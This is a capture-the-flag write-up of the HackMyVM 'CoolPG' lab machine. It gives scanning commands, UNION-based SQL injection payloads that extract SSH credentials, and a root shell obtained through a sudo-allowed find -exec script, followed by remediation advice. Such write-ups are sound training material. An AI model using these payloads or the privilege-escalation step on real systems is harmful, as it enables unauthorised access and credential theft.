CoolPG HackMyVM Machine – Full Penetration Testing Writeup
Date: April 19, 2026
Author: Security Researcher
Target IP: 192.168.56.104
Hostname: coolpgi.hmv
Objective: Gain unauthorized root access and capture flags (user.txt, root.txt)

Executive Summary
This report documents a complete penetration test against the CoolPG virtual machine from HackMyVM. The assessment followed a structured methodology including host discovery, service enumeration, web application testing, SQL injection exploitation, local privilege escalation, and final root compromise.

Key Findings:

Unauthenticated SQL Injection in /search endpoint leading to credential disclosure.

Hardcoded Database Credentials within the application source code.

Misconfigured sudoers allowing the low-privileged user cool to execute a script with an embedded command execution vector as root.

Full root compromise achieved with minimal effort after initial foothold.

The engagement resulted in the successful capture of both the user and root flags.

Methodology
Host Discovery (netdiscover, arp-scan)

Port Scanning & Service Enumeration (nmap)

Web Application Analysis (manual browsing, fuzzing, Burp Suite)

Exploitation – SQL Injection (manual UNION-based SQLi)

Initial Foothold – SSH Access (credentials exfiltration)

Local Enumeration & Privilege Escalation (LinPEAS, manual checks)

Root Exploitation (sudo misconfiguration abuse)

Flag Capture & Reporting

Detailed Attack Narrative
1. Host Discovery
The target machine was configured on a Host-Only network. After setting both attacker and victim VMs to the same Host-Only adapter, netdiscover was used to identify live hosts.

bash
sudo netdiscover -i eth0
Output identified the target IP as 192.168.56.104.

2. Service Enumeration (nmap)
A full TCP port scan revealed two open services:

bash
nmap -sC -sV -p- 192.168.56.104
Port	Service	Version
22	SSH	OpenSSH 10.0p2 Debian 7
80	HTTP	nginx
The web server presented a title: CoolPG Internal.

The hostname coolpgi.hmv was discovered during web fuzzing and added to /etc/hosts for proper name resolution.

bash
echo "192.168.56.104 coolpgi.hmv" | sudo tee -a /etc/hosts
3. Web Application Analysis
Browsing to http://coolpgi.hmv/ displayed a login page with no obvious authentication bypass. The page source contained an HTML comment hinting at an internal onboarding process.

Further directory/endpoint discovery (using common wordlists or manual browsing) revealed the following accessible routes:

/ – Login page

/panel – User search panel (no authentication required!)

/search – Endpoint that processes search queries

The /panel page contained a hint:
"Dev note: UNION reporting is supported for ops audits."

This strongly suggested a potential SQL injection vulnerability, specifically involving UNION queries.

4. SQL Injection Exploitation (Credential Extraction)
Testing the /search endpoint with a single quote ' returned a database error, confirming the presence of SQL injection.

The application intentionally allowed UNION keywords (as per the developer comment). The following payload was used to determine the number of columns and extract database version:

text
' UNION SELECT version() --
The version string PostgreSQL 17.6 (Debian ...) was reflected in the HTML table, confirming:

Database: PostgreSQL

Injection Type: UNION-based, reflected

Next, the table secrets was guessed (or discovered via enumeration of the information_schema). The following payload extracted the SSH credentials:

text
' UNION SELECT name || ':' || value FROM secrets --
Results:

text
ssh_user:cool
ssh_pass:ThisIsMyPGMyAdmin
The same credentials were also present hardcoded in the application source code (see Section 6).

5. Initial Foothold – SSH as cool
Using the extracted credentials, SSH access was obtained:

bash
ssh cool@192.168.56.104
Password: ThisIsMyPGMyAdmin
Upon successful login, the user flag was located in the home directory:

bash
cool@coolpgi:~$ ls
debug.log  user.txt
cool@coolpgi:~$ cat user.txt
HMV{...user_flag...}
6. Local Enumeration & Privilege Escalation Vector Discovery
Standard post-exploitation enumeration was performed, including running LinPEAS (linpeas.sh). The following critical misconfiguration was identified:

bash
sudo -l
Output:

text
User cool may run the following commands on coolpgi:
    (ALL) NOPASSWD: /usr/local/bin/runlogs-find.sh
Inspecting the script:

bash
cat /usr/local/bin/runlogs-find.sh
Contents:

bash
#!/bin/sh
exec /usr/bin/find /home/cool -maxdepth 3 -type f -name "*.log" -exec /bin/bash \; -quit
Analysis:

The script uses find with the -exec /bin/bash \; option.

The -quit flag stops after the first .log file found.

Because the script is executed with sudo (as root), the spawned /bin/bash will run with root privileges.

This is a classic unintended command execution vector due to dangerous use of -exec in a sudoers-allowed script.

Additionally, the application source code (/opt/coolapp/app.py) was found to contain hardcoded PostgreSQL credentials:

python
DB_HOST="127.0.0.1"
DB_NAME="coolpgdb"
DB_USER="coolpg"
DB_PASS="coolpgpass"
While not directly used for privilege escalation, this reinforces the insecure coding practices present on the system.

7. Privilege Escalation to Root
Exploitation Method 1 – Direct Root Shell (Unintended but Effective):

Because the script executes /bin/bash as root when a .log file exists within /home/cool (or its subdirectories up to depth 3), simply running the script with sudo drops the user into a root shell immediately, provided a matching file exists.

In this case, the file debug.log already existed in /home/cool, fulfilling the condition.

bash
sudo /usr/local/bin/runlogs-find.sh
root@coolpgi:/home/cool# whoami
root
Exploitation Method 2 – PATH Hijacking (Intended Alternative):

If the script had used a relative call to find (e.g., find ...), a PATH hijack would work. However, it used an absolute path (/usr/bin/find), making PATH hijacking ineffective. The real vulnerability is the -exec /bin/bash.

Regardless, the end result is the same: immediate root shell.

8. Capture of Root Flag
With root access, the root flag was read:

bash
cd /root
cat root.txt
HMV{coolpg_root_de6eac329255}
Summary of Vulnerabilities
Vulnerability	Severity	Impact
Unauthenticated SQL Injection (UNION-based)	Critical	Full database compromise, credential theft
Hardcoded Database Credentials in Source Code	High	Unauthorized database access
Misconfigured sudoers – Dangerous script	Critical	Local Privilege Escalation to root
Missing Authentication on /panel and /search	High	Direct access to sensitive functionality
Remediation Recommendations
Fix SQL Injection:

Use parameterized queries or prepared statements for all user-supplied input. Never concatenate user input directly into SQL strings, even conditionally.

Remove Hardcoded Credentials:

Store database credentials in environment variables or secure vaults (e.g., HashiCorp Vault, AWS Secrets Manager).

Restrict file permissions of app.py to prevent low-privileged users from reading it.

Restrict Access to /panel and /search:

Implement proper session-based authentication and authorization checks for all sensitive endpoints.

Harden sudoers Configuration:

Remove the (ALL) NOPASSWD entry for /usr/local/bin/runlogs-find.sh.

If the script is necessary, rewrite it to avoid executing shells via find -exec. Instead, use find only for listing files and pipe output to a safe processor.

Enforce secure_path in /etc/sudoers to prevent PATH hijacking.

Regular Security Audits:

Conduct periodic code reviews and penetration tests to identify and remediate such issues before production deployment.

Conclusion
The CoolPG machine demonstrated a realistic chain of vulnerabilities: from an unprotected SQL injection in a web application to credential theft, followed by a trivial local privilege escalation due to an overprivileged sudo script. The engagement highlights the importance of secure coding practices, proper access controls, and rigorous privilege management.

Final Flags:

user.txt: HMV{...}
